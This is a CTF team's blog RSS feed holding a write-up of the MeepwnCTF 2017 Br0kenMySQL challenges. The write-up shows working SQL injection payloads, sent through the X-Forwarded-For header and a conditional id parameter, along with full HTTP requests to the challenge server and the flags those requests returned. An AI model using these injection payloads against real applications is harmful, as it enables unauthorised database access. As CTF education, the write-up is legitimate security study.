@@ -1,0 +1,121 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+>
+
+<channel>
+	<title>sqli &#8211; BabyPhD CTF Team</title>
+	<atom:link href="https://babyphd.net/tag/sqli/feed/" rel="self" type="application/rss+xml" />
+	<link>https://babyphd.net</link>
+	<description>Nói chung đây là một khái niệm vô cùng trừu tượng</description>
+	<lastBuildDate>Thu, 27 Jul 2017 19:03:09 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
+		<title>MeepwnCTF 2017 - Br0kenMySQL	1-2-3</title>
+		<link>https://babyphd.net/2017/07/27/meepwnctf-2017-br0kenmysql1-2-3/</link>
+				<pubDate>Thu, 27 Jul 2017 15:00:47 +0000</pubDate>
+		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
+				<category><![CDATA[web]]></category>
+		<category><![CDATA[sqli]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=655</guid>
+				<description><![CDATA[SQL injection, it's not only about %27, everything is Art. The author is the artist, and the competitor is critic. But not me, I'm just a dude want to make some fun, solving those inovative challenge help me remove my limit barriers. There are 3 tasks. sourcecode sourcecode sourcecode These were written in PHP and MySQL, &#8230; <a href="https://babyphd.net/2017/07/27/meepwnctf-2017-br0kenmysql1-2-3/" class="more-link">Continue reading <span class="screen-reader-text">MeepwnCTF 2017 - Br0kenMySQL	1-2-3</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>SQL injection, it's not only about %27, everything is Art. The author is the artist, and the competitor is critic. But not me, I'm just a dude want to make some fun, solving those inovative challenge help me remove my limit barriers.</p>
+<p>There are 3 tasks.</p>
+<ol>
+<li><a href="https://pastebin.com/T7zAcdhb">sourcecode</a></li>
+<li><a href="https://pastebin.com/kLAyi6qS">sourcecode</a></li>
+<li><a href="https://pastebin.com/v0PAEFNY">sourcecode</a></li>
+</ol>
+<p><span id="more-655"></span></p>
+<p>These were written in PHP and MySQL, you will need knownledge and experience about it.</p>
+<p>1.</p>
+<p>A very very classic web vulnerability called <a href="https://www.owasp.org/index.php/SQL_Injection">SQL injection</a> (a kind of *injection*-ish) when you can inject your own query into developer's SQL query, make use of old query to extract information from database, make that query crash or keep it running depend on your purpose (leak full text or single bit, even out of band over other channel such as DNS, combine with XSS,..)</p>
+<p>On line 25 when <code>$id</code> combined with SELECT statement to get <code>username</code> out of <code>users</code> table with some filter, then that <code>username</code> <a href="http://php.net/manual/en/types.comparisons.php">strict compare</a> (===) with string <code>guest</code></p>
+<p>On line 36, again, <code>$ip</code> from <code>$_SERVER['HTTP_X_FORWARDED_FOR']</code> process through same filter will be insert into <code>logs</code> table, in PHP, `<a href="http://php.net/manual/en/reserved.variables.server.php">$_SERVER</a>['HTTP_X_FORWARDED_FOR']` equal to <a href="https://en.wikipedia.org/wiki/X-Forwarded-For"><code>X-Forwared-for</code></a> in HTTP request sent to the  PHP script.</p>
+<p>On line 38, same <code>$ip</code>  (after filtered) will be SELECT from same <code>users</code> table. But this time this should return <code>admin if we want flag at line 43.<br />
+</code></p>
+<p>This is confusing when with 2 same query but have 2 difference results. The first thing popped up like an alert box in my mind is using some kind of condition query. More detail, 1st: query return guest if condition A else admin, then change A; 2nd: because A changed so query return admin.</p>
+<p>The INSERT query could be abuse for that. In MySQL there is a thing called <a href="https://dev.mysql.com/doc/refman/5.7/en/user-variables.html">variable</a>.<br />
+They are permanently in same and single connection to database.<br />
+My ideas come clear with SQL query look like:</p>
+<p>select username from users where id = -1 union select ( 'guest' if @a=1337 else 'admin')<br />
+insert into logs values(''),(@a:=1337),('')<br />
+select username from users where id = -1 union select ( 'guest' if @a=1337 else 'admin')</p>
+<p>But I came first with a solution did not require `union` and `select`.<br />
+Enum the <code>id</code> parameter (?id=1,?id=2, ?id=3...) , it turned out 1 is <code>admin</code> and 2 is <code>guest</code>, add a little math-MySQL-magic, trial-error, help from MySQL documents, I have got final payload:</p>
+<p><code><br />
+GET /?id=2-if(@a=1337,@a:=1,@a:=0) HTTP/1.1<br />
+Host: 139.59.239.133<br />
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+Accept-Language: en-US,en;q=0.5<br />
+Accept-Encoding: gzip, deflate<br />
+Connection: close<br />
+X-Forwarded-For: 1'),(@a:=1337),('2<br />
+Upgrade-Insecure-Requests: 1<br />
+</code></p>
+<p>With response<br />
+<code>Br0kenMySQL<br />
+&lt;p style="color: red;"&gt;Br0kenMySQL&lt;/p&gt;<br />
+string(18) "1'),(@a:=1337),('2"<br />
+What ???????<br />
+Login as guest&amp;amp;admin at the same time ?<br />
+Seems our code is broken, here is your bounty<br />
+MeePwnCTF{_b4by_tr1ck_fixed}<br />
+</code><br />
+2.<br />
+This is an upgrade version of the first task.<br />
+It added more filter <code>select|from|<span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b99834bc19bbad24580b3adfa04fb947.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></code>, now I need <code>$id</code> without select, from, and (, ), luckily, now I only need remove ( and ),<br />
+In MySQL there are a lot of conditional statement. because <code>IF</code> need his parent-heses, in <code>CASE</code> of fire, break glass, <code>THEN</code> call <code>114</code>. Oh, did you who am I talking about?</p>
+<p>Yeah, it is <a href="https://dev.mysql.com/doc/refman/5.7/en/case.html">CASE ... THEN ... ELSE ... END</a><br />
+Debugging <code>INSERT</code> in mysqlclient connected to my test database let me know that I can assign variable's value inside statement, it is just a subquery if I correct.</p>
+<p><code>GET /v2/?id=2-case+when+%40a%3d1337+then+1+else+0+end HTTP/1.1<br />
+Host: 139.59.239.133<br />
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+Accept-Language: en-US,en;q=0.5<br />
+Accept-Encoding: gzip, deflate<br />
+Connection: close<br />
+X-Forwarded-For: '+@a:=1337+'<br />
+Upgrade-Insecure-Requests: 1</code></p>
+<p><code>Br0kenMySQL<br />
+&lt;p style="color: red;"&gt;Br0kenMySQL&lt;/p&gt;<br />
+string(12) "'+@a:=1337+'"<br />
+What, again ???????!@#$!@#$!@#$<br />
+MeePwnCTF{_I_g1ve__uPPPPPPPP}<br />
+http://139.59.239.133/c541c6ed5e28b8762c4383a8238e6f5632cc7df6da8ce9db7a1aa706d1e5c387/?debug=%F0%9F%95%B5<br />
+</code><br />
+3.<br />
+Althrough <code>time|date|sec|day</code> was blacklisted but I didn't use any of them.<br />
+Yay, same payload for 3rd flag.</p>
+<p>Thanks @ml for great challenges. You absolutely should try <a href="https://github.com/l4wio/CTF-challenges-by-me/tree/master/meepwn-2017">his CTF challenge</a> repo at Github.</p>
+<p>Ref:</p>
+<ul>
+<li>https://pastebin.com/T7zAcdhb</li>
+<li>https://pastebin.com/kLAyi6qS</li>
+<li>https://pastebin.com/v0PAEFNY</li>
+<li>https://www.owasp.org/index.php/SQL_Injection</li>
+<li>http://php.net/manual/en/types.comparisons.php</li>
+<li>http://php.net/manual/en/reserved.variables.server.php</li>
+<li>https://en.wikipedia.org/wiki/X-Forwarded-For</li>
+<li>https://dev.mysql.com/doc/refman/5.7/en/user-variables.html</li>
+<li>https://dev.mysql.com/doc/refman/5.7/en/case.html</li>
+<li>https://github.com/l4wio/CTF-challenges-by-me/tree/master/meepwn-2017</li>
+</ul>
+<p>&nbsp;</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">655</post-id>	</item>
+	</channel>
+</rss>
